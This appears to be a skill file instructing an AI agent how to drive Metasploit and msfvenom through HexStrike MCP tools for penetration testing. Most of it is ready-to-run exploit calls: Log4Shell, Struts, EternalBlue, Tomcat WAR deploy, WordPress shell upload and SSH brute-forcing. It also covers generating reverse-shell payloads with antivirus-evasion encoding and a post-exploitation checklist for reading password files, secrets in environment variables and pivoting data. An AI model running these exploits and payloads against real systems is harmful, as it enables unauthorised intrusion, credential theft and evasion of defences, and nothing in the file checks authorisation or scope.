---
name: "hexstrike-metasploit"
description: "Correct parameters, module selection, proxy configuration, and exploitation patterns for HexStrike metasploit_run and msfvenom_generate MCP tools."
---

# HexStrike Metasploit - metasploit_run and msfvenom_generate - Tool Skill

Exploit framework for running known vulnerability exploits and generating payloads. metasploit_run executes exploit modules against targets. msfvenom_generate creates payloads (reverse shells, meterpreter, encoded payloads). The heavy artillery of the exploitation phase.

---

## metasploit_run - Parameters

| Parameter | Type   | Required | Description                                                         |
| --------- | ------ | -------- | ------------------------------------------------------------------- |
| `module`  | string | **YES**  | Metasploit module path (e.g. `exploit/multi/http/apache_log4shell`) |
| `options` | string | **YES**  | Module options (e.g. `set RHOSTS 10.10.99.120; set RPORT 8080`)     |
| `flags`   | string | no       | Additional flags                                                    |

### Common Usage

```
# Exploit a known CVE
metasploit_run(module="exploit/multi/http/apache_log4shell", options="set RHOSTS 10.10.99.120; set RPORT 8080; set LHOST 10.10.99.100")

# Apache Struts RCE
metasploit_run(module="exploit/multi/http/struts2_content_type_ognl", options="set RHOSTS target.com; set RPORT 443; set SSL true")

# WordPress exploit
metasploit_run(module="exploit/unix/webapp/wp_admin_shell_upload", options="set RHOSTS target.com; set USERNAME admin; set PASSWORD password123")

# EternalBlue (SMB)
metasploit_run(module="exploit/windows/smb/ms17_010_eternalblue", options="set RHOSTS 10.10.99.120; set LHOST 10.10.99.100")

# Tomcat manager deploy
metasploit_run(module="exploit/multi/http/tomcat_mgr_deploy", options="set RHOSTS 10.10.99.120; set RPORT 8080; set HttpUsername admin; set HttpPassword admin")

# SSH brute-force (alternative to hydra)
metasploit_run(module="auxiliary/scanner/ssh/ssh_login", options="set RHOSTS 10.10.99.120; set USERNAME root; set PASS_FILE ./wordlists/SecLists/Passwords/Common-Credentials/best1050.txt")

# Service version scanning
metasploit_run(module="auxiliary/scanner/http/http_version", options="set RHOSTS 10.10.99.120")

# With proxy
metasploit_run(module="exploit/multi/http/apache_log4shell", options="set RHOSTS target.com; set Proxies http:user:pass@host:port; set LHOST 10.10.99.100")
```

### Module Types

| Type      | Prefix               | Purpose                                |
| --------- | -------------------- | -------------------------------------- |
| Exploit   | `exploit/`           | Active exploitation to get a shell     |
| Auxiliary | `auxiliary/scanner/` | Scanning and enumeration               |
| Post      | `post/`              | Post-exploitation (after shell access) |
| Payload   | `payload/`           | Standalone payloads (use msfvenom)     |

### Common Options

| Option     | Description                               |
| ---------- | ----------------------------------------- |
| `RHOSTS`   | Target IP/hostname                        |
| `RPORT`    | Target port                               |
| `LHOST`    | Your IP (for reverse shells)              |
| `LPORT`    | Your listening port (for reverse shells)  |
| `SSL`      | Use HTTPS (true/false)                    |
| `USERNAME` | Auth username                             |
| `PASSWORD` | Auth password                             |
| `Proxies`  | Proxy config (`http:user:pass@host:port`) |

---

## msfvenom_generate - Parameters

| Parameter | Type   | Required | Description                                               |
| --------- | ------ | -------- | --------------------------------------------------------- |
| `payload` | string | **YES**  | Payload type (e.g. `linux/x86/meterpreter/reverse_tcp`)   |
| `options` | string | **YES**  | Payload options (e.g. `LHOST=10.10.99.100 LPORT=4444`)    |
| `format`  | string | no       | Output format (e.g. `elf`, `exe`, `raw`, `python`, `php`) |
| `flags`   | string | no       | Additional flags (e.g. `-e x86/shikata_ga_nai -i 5`)      |

### Common Usage

```
# Linux reverse shell (ELF binary)
msfvenom_generate(payload="linux/x86/meterpreter/reverse_tcp", options="LHOST=10.10.99.100 LPORT=4444", format="elf")

# Windows reverse shell
msfvenom_generate(payload="windows/meterpreter/reverse_tcp", options="LHOST=10.10.99.100 LPORT=4444", format="exe")

# PHP web shell
msfvenom_generate(payload="php/meterpreter/reverse_tcp", options="LHOST=10.10.99.100 LPORT=4444", format="raw")

# Python payload
msfvenom_generate(payload="python/meterpreter/reverse_tcp", options="LHOST=10.10.99.100 LPORT=4444", format="raw")

# Encoded payload (AV evasion)
msfvenom_generate(payload="windows/meterpreter/reverse_tcp", options="LHOST=10.10.99.100 LPORT=4444", format="exe", flags="-e x86/shikata_ga_nai -i 5")

# WAR file (for Tomcat deploy)
msfvenom_generate(payload="java/jsp_shell_reverse_tcp", options="LHOST=10.10.99.100 LPORT=4444", format="war")
```

---

## Proxy Configuration

```
# In metasploit_run options
metasploit_run(module="...", options="set RHOSTS target; set Proxies http:user:pass@host:port")
```

**Note**: Metasploit proxy format is `http:user:pass@host:port` (colon after http, not //).

---

## Retry Strategy

1. **"Exploit completed, but no session was created"** - exploitation FAILED. Try different payload, different port, or verify target is actually vulnerable.
2. **Connection refused** - target port may not be open. Verify with nmap first.
3. **Timeout** - increase timeout with `set WfsDelay 30`. Target may be slow.
4. **Module not found** - check module path is exact. Use `search` in Metasploit for correct path.
5. **Payload architecture mismatch** - verify target OS/arch. Use `linux/x64/` for 64-bit Linux.
6. **AV/IPS blocking** - try encoded payload via msfvenom. Try different payload type.

## Output Interpretation

- **"Meterpreter session N opened"** - SUCCESS. You have a shell. Proceed to post-exploitation.
- **"Exploit completed, but no session was created"** - FAILED. Do NOT report as successful.
- **"The target is not exploitable"** - NOT vulnerable to this specific exploit.
- **Auxiliary scan results** - informational. Use to inform exploit selection.
- **"Command shell session N opened"** - basic shell (not meterpreter). Still a win.

## Post-Exploitation Checklist

When a shell is obtained:

1. `whoami` / `id` - what user are you?
2. `uname -a` / `systeminfo` - OS details
3. `cat /etc/passwd` - user list
4. `env` - environment variables (may contain secrets)
5. `ifconfig` / `ipconfig` - network info for pivoting
6. `ls /home/` / `dir C:\Users\` - user directories
7. Check for privilege escalation opportunities

## Evidence Capture

Save Metasploit output to `output/{target}/exploits/raw/metasploit_*.txt`. Shell access is strong evidence, but severity depends on privileges and demonstrated impact. Persist the minimum evidence required for review.
